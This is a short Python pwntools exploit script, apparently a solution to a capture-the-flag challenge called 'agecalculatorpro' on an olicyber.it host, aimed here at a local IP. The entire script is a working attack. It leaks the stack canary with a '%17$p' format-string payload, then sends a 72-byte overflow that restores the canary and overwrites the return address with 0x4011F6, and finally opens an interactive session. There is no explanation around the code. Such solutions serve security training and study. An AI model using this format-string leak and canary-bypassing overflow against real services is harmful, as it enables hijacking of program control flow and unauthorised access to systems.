from pwn import *
from Crypto.Util.number import bytes_to_long

#r = remote("agecalculatorpro.challs.territoriale.olicyber.it", 38103)
r = remote("192.168.100.3", 38103)

r.recvuntil(b"?\n")
r.sendline(b"%17$p") 
canary = r.recvuntil(b",")[2:-1]
r.sendline(b"a"*72 + p64(bytes_to_long(bytes.fromhex(canary.decode()))) + b"a"*8 + p64(0x4011F6))
r.interactive()